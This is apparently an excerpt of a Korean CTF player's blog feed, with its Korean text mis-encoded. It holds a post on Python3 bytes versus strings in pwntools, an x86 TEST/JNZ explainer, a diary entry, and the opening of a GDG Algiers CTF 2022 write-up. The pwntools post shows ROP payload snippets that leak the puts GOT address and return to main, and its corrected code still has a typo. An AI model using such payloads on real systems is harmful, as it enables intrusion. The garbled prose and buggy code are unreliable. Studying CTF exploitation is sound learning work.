b&#x27;jir4vvit&#x27;.decode()</span><br><span class="line">&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>ìš”ì¦˜ Pwnableì„ í’€ ë•Œ Python3ìœ¼ë¡œ ìž‘ì„±í•˜ê³  ìžˆë‹¤. ì´ê²ƒì„ í—·ê°ˆë¦¬ê³  ê°€ìž¥ ì²˜ìŒì— í–ˆë˜ ì‹¤ìˆ˜ëŠ” ì•„ëž˜ì™€ ê°™ë‹¤. ì§€ê¸ˆ ìƒê°í•´ë³´ë©´ ì™œ ì´ë ‡ê²Œ í–ˆì—ˆëŠ”ì§€ ì´í•´ê°€ ì•ˆê°„ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(b&#x27;jir4vvit&#x27;)</span><br><span class="line">&quot;b&#x27;jir4vvit&#x27;&quot;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>ë¬¸ìžì—´ì— ëŒ€í•œ ì´í•´ë¥¼ ì œëŒ€ë¡œ í•˜ì§€ ì•Šê³  ì €ì§€ë¥¸ ì‹¤ìˆ˜ì´ë‹¤. Python3ë‹ˆê¹Œ ì–´ë””ì„œ ë§Žì´ ë³¸ <code>b&#39;&#39;</code>ìœ¼ë¡œ ë¬¸ìžì—´ì„ ê°ì‹¸ê³  ì´ê±¸ <code>str()</code>ë¡œ ê°ì‹¸ì„œ <code>p.send()</code>í–ˆì—ˆë‹¤. </p><p><strong>ì—¬ëŸ¬ ì‹œë„ ëì— ë§ˆìŒíŽ¸í•˜ê²Œ byte ë¬¸ìžì—´ë¡œ payloadë¥¼ êµ¬ì„±í•˜ê¸°ë¡œ í–ˆë‹¤.</strong></p><p>ì•„ëž˜ì²˜ëŸ¼ ë¬¸ìžì—´ë¡œ payloadë¥¼ êµ¬ì„±í•˜ë©´ ë  ë•Œë„ ìžˆê³  ì•ˆë  ë•Œë„ ìžˆë‹¤. ë˜ëŠ” ê±´ ìš´ì´ ì¢‹ì€ ë•Œê³ , ì•ˆë  ë•ŒëŠ” ì—ëŸ¬ê°€ ë°œìƒí•œë‹¤. (ì•ˆë˜ëŠ” ê²½ìš°ê°€ ë” ë§Žì„ ê²ƒ ê°™ë‹¤.)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += &#x27;A&#x27; * 0x50</span><br><span class="line">payload += &#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27; # rbp</span><br><span class="line">payload += &#x27;\x83\x0c\x40\x00\x00\x00\x00\x00&#x27; # pop rdi</span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;]).decode()</span><br><span class="line">payload += &#x27;\xe0\x06\x40\x00\x00\x00\x00\x00&#x27; # puts plt</span><br><span class="line">payload += p64(main).decode()</span><br></pre></td></tr></table></figure><p>ì‹¤ì œë¡œ ì•„ëž˜ì™€ ê°™ì€ ë””ì½”ë“œê°€ ì•ˆëœë‹¤ëŠ” ì—ëŸ¬ë¥¼ ë°›ì•˜ì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/jir4vvit/ex.py&quot;, line 99, in &lt;module&gt;</span><br><span class="line">    payload += p64(binsh).decode()</span><br><span class="line">UnicodeDecodeError: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xcf in position 1: invalid continuation byte</span><br></pre></td></tr></table></figure><p>ë§ˆìŒíŽ¸ížˆ byteë¡œ ë³´ë‚´ë©´ ì €ëŸ° ë””ì½”ë”© ì—ëŸ¬ë¥¼ ë§Œë‚  ì¼ì´ ì—†ë‹¤. pwntoolsëŠ” ê¸°ë³¸ì ìœ¼ë¡œ byteë¡œ ì²˜ë¦¬í•˜ê¸° ë•Œë¬¸ì— payloadë¥¼ ì•„ëž˜ì²˜ëŸ¼ byteë¡œ ìž‘ì„±í•´ì£¼ë©´ ì •ë§ì •ë§ ë””ì½”ë”© ì—ëŸ¬ë¥¼ ë§Œë‚  ì¼ì´ ì—†ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += b&#x27;A&#x27; * 0x50</span><br><span class="line">payload += p64(0) # rbp</span><br><span class="line">payload += p64(pop_rdi) </span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p64(e.symbols[&#x27;puts])</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p>ë˜í•œ Python2ì™€ ë‹¤ë¥´ê²Œ byte ë¬¸ìžì—´ê³¼ ë¬¸ìžì—´ì„ í˜¼í•©í•´ì„œ ìž‘ì„±í•  ìˆ˜ ì—†ë‹¤. ì¼ê´€ë˜ê²Œ ìž‘ì„±í•´ì•¼ í•œë‹¤. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://whatisthenext.tistory.com/103">https://whatisthenext.tistory.com/103</a></li><li><a href="https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0">https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0</a></li><li><a href="https://finebe.tistory.com/42">https://finebe.tistory.com/42</a></li><li><a href="https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0">https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0</a></li></ul><p>ì´ ê¸€ì„ ìž‘ì„±í•  ë‹¹ì‹œì—” ëŒ“ê¸€ê¸°ëŠ¥ì´ ì—†ë‹¤. í‹€ë¦° ë§ì´ë‚˜ ì²¨ì–¸ì´ ìžˆë‹¤ë©´ ë©”ì¼ í•œ í†µ ë¶€íƒë“œë¦½ë‹ˆë‹¤. ë©”ì¼ ì£¼ì†ŒëŠ” <a href="https://jiravvit.github.io/">ë¸”ë¡œê·¸ ë©”ì¸ í™”ë©´</a> ì—ì„œ ì°¾ì„ ìˆ˜ ìžˆìŠµë‹ˆë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Etc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> string </tag>
            
            <tag> Unicode </tag>
            
            <tag> ASCII </tag>
            
            <tag> byte </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What does the &#39;TEST&#39; instruction do</title>
      <link href="/221013-test-instruction/"/>
      <url>/221013-test-instruction/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>ì–´ì…ˆë¸”ë¦¬ì–´ì—ì„œ <code>TEST</code> ëª…ë ¹ì–´ëŠ” <code>eax</code>ì˜ ê°’ì´ 0ì´ëƒ ì•„ë‹ˆëƒë¥¼ íŒë‹¨í•˜ê¸° ìœ„í•´ì„œ ì‚¬ìš©í•œë‹¤. ë§Œì•½ <code>eax</code>ì˜ ê°’ì´ 0ì´ë¼ë©´ (<code>zf</code>ê°€ ì„¸íŒ…ë˜ì–´) ë’¤ì— <code>JE</code>ë‚˜ <code>JZ</code> ëª…ë ¹ì–´ê°€ ì˜¨ë‹¤ë©´ jumpí•œë‹¤.</p><h2 id="TEST-ëª…ë ¹ì–´"><a href="#TEST-ëª…ë ¹ì–´" class="headerlink" title="TEST ëª…ë ¹ì–´"></a>TEST ëª…ë ¹ì–´</h2><p>ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ì–¸ì œ jumpí•˜ëŠ”ì§€ í•­ìƒ í—·ê°ˆë ¤ì„œ ë¸”ë¡œê·¸ì— ì •ë¦¬í•˜ë ¤ê³  í•œë‹¤..</p><p>ì•„ëž˜ëŠ” ì˜ˆì‹œ ì–´ì…ˆë¸”ë¦¬ì–´ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000131E</span><br><span class="line">.text:0000131E loc_131E:</span><br><span class="line">.text:0000131E lea     eax, (var - 4000h)[ebx]</span><br><span class="line">.text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br><span class="line">.text:0000132A xor     eax, 11h</span><br><span class="line">.text:0000132D or      eax, edx</span><br><span class="line">.text:0000132F test    eax, eax</span><br><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><p>ê°„ë‹¨í•˜ë‹¤.</p><p><code>test    eax, eax</code> ì—ì„œ <code>eax</code>ê°€ 0ì¸ì§€ íŒë‹¨í•˜ê³ , ë§Œì•½ 0ì´ë¼ë©´ <code>zf</code>ê°€ 1ë¡œ ì„¸íŒ…ëœë‹¤. <code>jnz(=jump not zero)</code> ëª…ë ¹ì–´ëŠ” ì´ë¦„ ê·¸ëŒ€ë¡œ 0ì´ ì•„ë‹ ê²½ìš° jumpí•˜ê¸° ë•Œë¬¸ì— <code>eax</code>ê°€ 0ì´ë¼ë©´ jumpí•˜ì§€ ì•ŠëŠ”ë‹¤. </p><p>í•˜ì§€ë§Œ ë¬¸ì œ í’€ ë•Œ ì˜ì™¸ë¡œ ë§Žì´ í—·ê°ˆë ¸ìœ¼ë¯€ë¡œ ì´ ë¡œì§ì„ ì¡°ê¸ˆ ë” ëœ¯ì–´ë³´ìž.</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br></pre></td></tr></table></figure><ul><li>ì´ ì—°ì‚°ì€ <code>edx</code>ì™€ <code>eax</code> ì£¼ì†Œì— ê°’ì„ ì €ìž¥í•˜ëŠ” ì—°ì‚°ì´ë‹¤.</li><li>ì‚¬ìš©ìž ì¸í’‹ì€ <code>eax</code> ì£¼ì†Œì— ì €ìž¥ëœë‹¤. bssì˜ì—­ ì •ì˜ëœ ë°°ì—´ì— ê°’ì„ ì“°ëŠ”ë° ì–´ì§¸ì„ ì§€ ë°°ì—´ì˜ ì‚¬ì´ì¦ˆë¥¼ ëª¨ë¥´ëŠ” ìƒí™©ì´ë‹¤.</li><li><code>edx</code>ì— ë°°ì—´ ë°–ì˜ ê°’ì´ ì €ìž¥ëœë‹¤ëŠ” ì‚¬ì‹¤ì„ íŒŒì•…í•´ë³´ìž.</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132A xor     eax, 11h</span><br></pre></td></tr></table></figure><ul><li><code>xor</code> ì—°ì‚°ì„ ì§„í–‰í•œë‹¤. <code>eax</code>ê°€ 0x11ë¼ë©´ 0ìœ¼ë¡œ ì´ˆê¸°í™”ê°€ ë˜ê² ê³ , 0ì´ë¼ë©´ <code>eax</code>ì— 0x11ê°€ ì €ìž¥ë  ê²ƒ ì´ë‹¤.</li><li>ì•ž ë¶€ë¶„ ë¶„ì„ì„ í•´ë³´ë©´ <code>eax</code>ì— ë¬´ì¡°ê±´ 0x11ì„ ë„£ê³  ì‹¶ì–´ì§ˆ ê²ƒì´ê¸° ë•Œë¬¸ì— ì´ ì—°ì‚° ê°’ì€ 0ì´ ë˜ê³  <code>eax</code>ì— 0ì´ ë‹´ê¸´ë‹¤.</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132D or      eax, edx</span><br></pre></td></tr></table></figure><ul><li><code>or</code> ì—°ì‚°ì„ ì§„í–‰í•œë‹¤. ë‘ ê°’ ì¤‘ ì–´ëŠ í•˜ë‚˜ë¼ë„ 0ì´ ì•„ë‹ˆë©´ 0ì´ ì•„ë‹Œ ìˆ˜ê°€ <code>eax</code>ì— ë‹´ê¸¸ ê²ƒì´ë‹¤. </li><li>í˜„ìž¬ <code>eax</code>ì€ 0ìœ¼ë¡œ ê³ ì •ì´ë¯€ë¡œ <code>edx</code> ê°’ì— ì§‘ì¤‘í•˜ì—¬ ë¶„ì„í•´ë³´ìž.</li><li><code>edx</code>ê°€ 0ì´ë¼ë©´? <code>0 | 0 = 0</code>, <code>eax</code>ì˜ ê°’ì€ 0ì´ ëœë‹¤.</li><li><code>edx</code>ê°€ Xë¼ë©´? <code>0 | X = X</code>, <code>eax</code>ì˜ ê°’ì€ Xì´ ëœë‹¤.</li></ul><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132F test    eax, eax</span><br></pre></td></tr></table></figure><ul><li><code>eax</code>ê°€ 0ì¸ì§€ë¥¼ ê²€ì‚¬í•œë‹¤. ì‹¤ì œë¡œ <code>eax</code>ì— ê°’ì„ ì“°ì§€ëŠ” ì•ŠëŠ”ë‹¤.</li><li><code>eax</code>ê°€ 0ì¸ ê²½ìš°: <code>edx</code>ì˜ ê°’ì´ 0ì¸ ê²½ìš° </li><li><code>eax</code>ê°€ Xì¸ ê²½ìš°: <code>edx</code>ì˜ ê°’ì´ Xì¸ ê²½ìš°</li></ul><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><ul><li><code>jnz = jump not zero</code></li><li><code>eax</code>ê°€ 0ì´ ì•„ë‹ˆë©´ jumpí•œë‹¤.</li><li>ì°¸ê³ ë¡œ <code>loc_1347</code>ì€ ì‹¤í–‰í•˜ê³  ì‹¶ì€ ë¡œì§ì´ ì•„ë‹ˆë‹¤.</li><li>ê²°ë¡ ì ìœ¼ë¡œ jumpë¥¼ í•˜ë©´ ì•ˆë˜ê³ , <code>eax</code>ê°€ 0ì´ì–´ì•¼ í•œë‹¤. <code>eax</code>ê°€ 0ì´ë ¤ë©´ <code>edx</code>ê°€ 0ì´ì–´ì•¼ í•œë‹¤.</li><li>overflowë•Œë¬¸ì— <code>edx</code>ì— ê°’ì„ ìž…ë ¥í•  ìˆ˜ ìžˆì§€ë§Œ ë°°ì—´ í¬ê¸° ê²€ì‚¬ë¥¼ ì§„í–‰í–ˆê¸° ë•Œë¬¸ì— ê°’ì„ ì“°ë©´ ì•ˆëœë‹¤ëŠ” ê²°ë¡ ì„ ì–»ì„ ìˆ˜ ìžˆë‹¤.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Etc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rev </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-11 Diary</title>
      <link href="/221011-diary/"/>
      <url>/221011-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="ë¸”ë¡œê·¸-ì´ì „"><a href="#ë¸”ë¡œê·¸-ì´ì „" class="headerlink" title="ë¸”ë¡œê·¸ ì´ì „"></a>ë¸”ë¡œê·¸ ì´ì „</h2><p>9ì›” ì¤‘ìˆœ? ë§? ì¯¤ì— ë¸”ë¡œê·¸ í”Œëž«í¼ì„ ì˜®ê²¼ì—ˆë‹¤. ì›ëž˜ëŠ” <a href="https://jiravvit.tistory.com/">í‹°ìŠ¤í† ë¦¬ ë¸”ë¡œê·¸</a>ë¥¼ ì´ì–´ì„œ ì“°ë ¤ê³  í–ˆì—ˆë‹¤. í•˜ì§€ë§Œ ê°œì¸ì ìœ¼ë¡œ í‹°ìŠ¤í† ë¦¬ ë¸”ë¡œê·¸ì˜ ì½”ë“œë¸”ëŸ­ì´ êµ‰ìž¥ížˆ ë§ˆìŒì— ì•ˆë“¤ì—ˆê³  ê·¸ëƒ¥ ë­”ê°€ ìƒˆë¡œìš´ ê¸°ë¶„ì„ ë‚´ê³  ì‹¶ì–´ì„œ ë¸”ë¡œê·¸ í”Œëž«í¼ì„ ì˜®ê¸°ê³  ì‹¶ë‹¤ëŠ” ìƒê°ì´ ë“¤ì—ˆë‹¤. ê·¸ëŸ¬ë˜ ì¤‘ì— ì§€ê¸ˆ ìž‘ì„± ì¤‘ì¸ github ë¸”ë¡œê·¸ë¥¼ ì¶”ì²œë°›ì•˜ë‹¤. </p><p>ê·¸ëž˜ì„œ github ë¸”ë¡œê·¸ë¥¼ ê°œì„¤í•˜ê³  ê¸€ë„ ëª‡ê°œ ì ì–´ë†¨ì—ˆëŠ”ë°, ìš´ì˜ì²´ì œë¥¼ ë°”ê¾¸ë‹¤ê°€ ë¸”ë¡œê·¸ë¥¼ ë‚ ë ¤ë¨¹ì—ˆë‹¤.</p><p>ë‚˜ëŠ” Hexoë¥¼ ì´ìš©í•˜ê³  ìžˆë‹¤. HexoëŠ” <code>hexo generate</code> ëª…ë ¹ìœ¼ë¡œ public í´ë” ì•ˆì— ì •ì  íŒŒì¼ì„ ìƒì„±í•˜ê³ , <code>hexo deploy</code>ë¡œ ê·¸ ì •ì  íŒŒì¼ë“¤ì„ gitì— ì˜¬ë¦¬ê¸° ìœ„í•´ <code>.deploy_git</code> í´ë”ì— ë³µì‚¬í•˜ê³  ì´ ê³³ì— ìžˆëŠ” ê²ƒë§Œ ê¹ƒí—ˆë¸Œ ë¸”ë¡œê·¸ì— ì˜¬ë¼ê°€ëŠ” êµ¬ì¡°ì´ë‹¤.</p><p>ê·¸ëž˜ì„œ ë§Œì•½ ë‹¤ë¥¸ ì»´í“¨í„°ì—ì„œ ë¸”ë¡œê·¸ ê¸€ì„ ìž‘ì„±í•˜ê³  ì‹¶ë‹¤ë©´ hexo ë¸”ë¡œê·¸ë¥¼ ìƒì„±í•´ì£¼ëŠ” íŒŒì¼ ì „ì²´ë¥¼ ë‹´ëŠ” í´ë”ë„ ê´€ë¦¬ë¥¼ í•´ì•¼í•œë‹¤. ã…‹ã…‹..</p><p>ì•„ë¬´íŠ¼ ë‚ ë ¤ë¨¹ì–´ì„œ ì ˆë§ì— ë¹ ì ¸ìžˆì—ˆëŠ”ë° ë‹¤í–‰ížˆ ê¸€ì„ ìž‘ì„±í–ˆë˜ mdíŒŒì¼ì€ ê°€ì§€ê³  ìžˆì—ˆì–´ì„œ ë‚´ìš© ìžì²´ë¥¼ ì „ë¶€ ë‚ ë ¤ë¨¹ì§€ëŠ” ì•Šì•˜ë‹¤. ì‚¬ì‹¤ ë¸”ë¡œê·¸ í…Œë§ˆë„ ì¡°ê¸ˆ ë§ˆìŒì— ì•ˆë“¤ì—ˆì–´ì„œ ë°”ê¾¸ê³  ì‹¶ì€ ìš•ì‹¬ì´ ìžˆì—ˆëŠ”ë° ìž˜ëì§€ ë­â€¦ T.T</p><p>ì „ì— ì“°ë˜ ë¸”ë¡œê·¸ í…Œë§ˆëŠ” light ëª¨ë“œëŠ” ì˜ˆìœë° dark ëª¨ë“œëŠ” ë³„ë¡œ ì˜ˆì˜ì§€ê°€ ì•Šì•˜ë‹¤. ì–´ë‘ìš´ ê³³ì—ì„œ ì»´í“¨í„°ë¥¼ í•˜ëŠ” ë¹„ìœ¨ì´ ë§Žì•„ì ¸ì„œ dark ëª¨ë“œë¥¼ ì¡°ê±´ìœ¼ë¡œ í…Œë§ˆë¥¼ ì´ë¦¬ì €ë¦¬ ë‘˜ëŸ¬ë´¤ëŠ”ë°, ì§€ê¸ˆ ì“°ê³  ìžˆëŠ” ì´ í…Œë§ˆê°€ dark ëª¨ë“œì—ì„œ ê°€ìž¥ ì´ì˜ë‹¤ê³  ìƒê°í–ˆë‹¤. </p><p>ë‚˜ì¤‘ì— sitemapë„ ë‹¤ì‹œ ë“±ë¡í•˜ê³  ëŒ“ê¸€ ê¸°ëŠ¥ë„ ì°¨ì°¨ ì¶”ê°€í•´ì•¼ê² ë‹¤.. </p><h2 id="POXX-2022-ì˜ˆì„ "><a href="#POXX-2022-ì˜ˆì„ " class="headerlink" title="POXX 2022 ì˜ˆì„ "></a>POXX 2022 ì˜ˆì„ </h2><p>ì–¼ë§ˆ ì „ì— ì—¬ì„± í•´í‚¹ ëŒ€íšŒ POXX ì˜ˆì„ ì´ ìžˆì—ˆë‹¤. DemoníŒ€ìœ¼ë¡œì„œ pwn 2ë¬¸ì œ, rev 1ë¬¸ì œë¥¼ ì¶œì œí–ˆë‹¤. ë¬¸ì œì— ëŒ€í•œ ì´ì•¼ê¸°ë¥¼ í’€ì–´ë³´ê³  ì‹¶ì€ë° ë³¸ì„  ëë‚˜ê³  í’€ê³ ìž í•œë‹¤. pwn 2ë¬¸ì œëŠ” ê°ê° 3, 2 solveë¥¼ ë‹¬ì„±í–ˆë‹¤. ëª©í‘œí–ˆë˜ solve ìˆ˜ì™€ ë¹„ìŠ·í•´ì„œ ë‹¤í–‰ì´ì—ˆë‹¤.</p><h2 id="ìžìž˜í•œ-ì´ì•¼ê¸°"><a href="#ìžìž˜í•œ-ì´ì•¼ê¸°" class="headerlink" title="ìžìž˜í•œ ì´ì•¼ê¸°"></a>ìžìž˜í•œ ì´ì•¼ê¸°</h2><ol><li><p>ìš”ì¦˜ ë„ì»¤ì™€ ì¹œí•´ì§€ë ¤ê³  ë…¸ë ¥ ì¤‘ì´ë‹¤. ì˜ˆì „ì— ì—¬ëŸ¬ë²ˆ ì‹œë„í–ˆì—ˆëŠ”ë° ì‚¬ìš©ë²•ì´ ì ì‘ì´ ì•ˆë˜ì–´ì„œ ì‹¤íŒ¨í•˜ê³  ê°€ìƒë¨¸ì‹ ì„ ì„¤ì¹˜í–ˆì—ˆë‹¤..ã…‹ã…‹ ê·¸ëŸ°ë° ì´ë²ˆì—” ì¡°ê¸ˆ ë§Žì´ ì¹œí•´ì¡Œë‹¤. ë¿Œë“¯í•˜ë‹¤.</p></li><li><p>ì „ì— ë‹¤ë‹ˆë˜ ëŒ€í•™ì—ì„œ ë³´ì•ˆ ê´€ë ¨ì—ì„œ ë°œí‘œë¥¼ í•´ì£¼ë©´ ì¢‹ê² ë‹¤ê³  ì—°ë½ì´ ì™”ì—ˆë‹¤. ë¬´ë ¤ ì´ìž¥ë‹˜ì˜ ë¶€ë¦„ì´ì—ˆëŠ”ë° ê°œì¸ì‚¬ìœ ë¡œ ì¸í•´ ê±°ì ˆí–ˆë‹¤. ìž˜ ì˜¤ì§€ ì•ŠëŠ” ê¸°íšŒì˜€ëŠ”ë° ì•„ì‰½ë‹¤.</p></li><li><p>ìš´ì˜ì²´ì œë¥¼ ë°”ê¿¨ë‹¤. windows 11ì—ì„œ arch linuxë¡œ.. ã…‹ã…‹<br>windowsê°€ ê°€ìž¥ ë¶ˆíŽ¸í–ˆë˜ ê²ƒì€ ê°€ìƒë¨¸ì‹ ì„ êµ¬ë™í•˜ë‹¤ë³´ë©´ ê°€ìƒë¨¸ì‹  ìžì²´ê°€ ë§¤ìš°ë§¤ìš°ë§¤ìš° ëŠë ¤ì§„ë‹¤. ê·¸ë¦¬ê³  ë­”ê°€ ì°½ ê´€ë¦¬ê°€ ì•ˆëë‹¤. ì‚¬ì‹¤ wslë„ ì¶”ì²œë°›ê³  ì¨ë´¤ì—ˆëŠ”ë° ë­”ê°€ ë‚´ ìŠ¤íƒ€ì¼ì€ ì•„ë‹ˆì—ˆë‹¤(?) ê·¸ëŸ¬ë˜ ì¤‘ì— arch linuxë¡œ ìš´ì˜ì²´ì œë¥¼ ë°”ê¾¸ëŠ” ê±´ ì–´ë–»ëƒê³  ê¶Œìœ ë°›ì•˜ê³  ë°”ë¡œ ì‹¤í–‰í•˜ì˜€ë‹¤. ã…Ž<br>windowsì—ì„œ ê°€ìƒë¨¸ì‹ ìœ¼ë¡œ ubuntuë¥¼ ì“°ëŠ” ê²ƒê³¼ ê°€ìž¥ í° ì°¨ì´ëŠ” archëŠ” ì •ë§ ê¹”ë ¤ìžˆëŠ” ê²Œ ì—†ë‹¤ëŠ” ê²ƒì´ë‹¤. ì‚¬ìš©ìžê°€ ì „ë¶€ ë‹¤ ì„¤ì •í•´ì¤˜ì•¼ í•œë‹¤. ìžìœ ë„ê°€ ë†’ê³  ê°€ë³ë‹¤ëŠ” ê²ƒì´ ì–´ë–¤ê±´ì§€ ë°”ë¡œ ì‹¤ê°í•  ìˆ˜ ìžˆì—ˆë‹¤. ê·¸ë¦¬ê³  ubuntuë¥¼ ì„¤ì¹˜í•  ë• next ë²„íŠ¼ í•˜ë‚˜ë¡œ ëª¨ë“  ê²ƒì´ ì§„í–‰ë˜ì—ˆëŠ”ë°, ì´ê±´ ë‚´ê°€ ì§ì ‘ ëª…ë ¹ì–´ë¥¼ ì³ì¤˜ì•¼ í•œë‹¤. ì¢€ ì‹ ê¸°í–ˆë‹¤.<br>i3 ì²˜ìŒ ì“¸ ë•Œ ì •ë§ ì•ˆìµìˆ™í–ˆì—ˆëŠ”ë° ì§€ê¸ˆì€ ë§Žì´ ìµìˆ™í•´ì¡Œë‹¤. ì˜¤ížˆë ¤ i3ì„ ì“°ì§€ ì•Šìœ¼ë©´ ë¶ˆíŽ¸í•˜ë‹¤. archë„ ê·¸ë ‡ê²Œ ë  ê²ƒì´ë¼ ë¯¿ëŠ”ë‹¤.</p></li><li><p>ë¶„ì„í•˜ê³  ì‹¶ì€ ê²ƒì´ ìžˆì—ˆì–´ì„œ ë¶„ì„ì„ ìž ê¹ í–ˆì—ˆëŠ”ë° ì—­ì‹œë‚˜ ë¶„ì„ì€ ì–´ë µë‹¤. ê´€ë ¨ ë‚´ìš©ì„ ë‚˜ì¤‘ì— ë¸”ë¡œê·¸ì— ì ê³  ì‹¶ë‹¤.</p></li><li><p>ë‚˜ì¤‘ì— ì˜ì–´ë¡œë„ ê¸€ì„ ì¨ë³´ê³  ì‹¶ë‹¤. ì–¸ì  ê°„ ê¼­..</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDG Algiers CTF 2022 - mind games (random)</title>
      <link href="/221011-gdg_algires_ctf_2022-mind_games/"/>
      <url>/221011-gdg_algires_ctf_2022-mind_games/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Arch linux<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: binary, source code, libc </p><p>Help! This program is playing mind games with me! You need to put an end to this madness.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><p>ì œê³µëœ source codeê°€ ì§§ì•„ì„œ ì „ë¬¸ì„ ì˜¬ë ¸ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 